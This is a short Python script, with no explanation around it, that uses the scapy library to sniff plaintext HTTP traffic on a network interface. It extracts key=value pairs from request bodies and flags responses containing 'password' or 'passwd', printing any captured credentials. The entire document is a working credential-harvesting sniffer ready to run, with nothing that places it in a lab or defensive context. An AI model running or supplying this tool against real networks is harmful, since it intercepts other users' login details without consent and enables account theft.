from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse
import re

def packet_callback(packet):
    if packet.haslayer(HTTPRequest):
        # Extract the URL from the HTTP request
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors="ignore")
            # Search for key-value pairs that might be credentials
            credentials = re.findall(r'(\w+=(?:[^\s&]*))', payload)
            if credentials:
                print(f"\n[REQUEST] {url} > " + ', '.join(credentials))
    elif packet.haslayer(HTTPResponse) and packet.haslayer(Raw):
        # Process HTTP responses to look for keywords like password
        payload = packet[Raw].load.decode(errors="ignore")
        # Search for key-value pairs potentially containing credentials
        credentials = re.findall(r'(\w+=(?:[^\s&]*))', payload)
        if any("password" in item.lower() or "passwd" in item.lower() for item in credentials):
            print("\n[!] Possible username/password in response > " + ', '.join(credentials))

# Set up sniffing session, filtering for HTTP traffic
def start_sniff(interface):
    print(f"Starting sniffer on interface {interface}")
    sniff(iface=interface, prn=packet_callback, store=False, filter="tcp port 80")

# Replace 'eth0' with your network interface
interface = "eth0"
start_sniff(interface)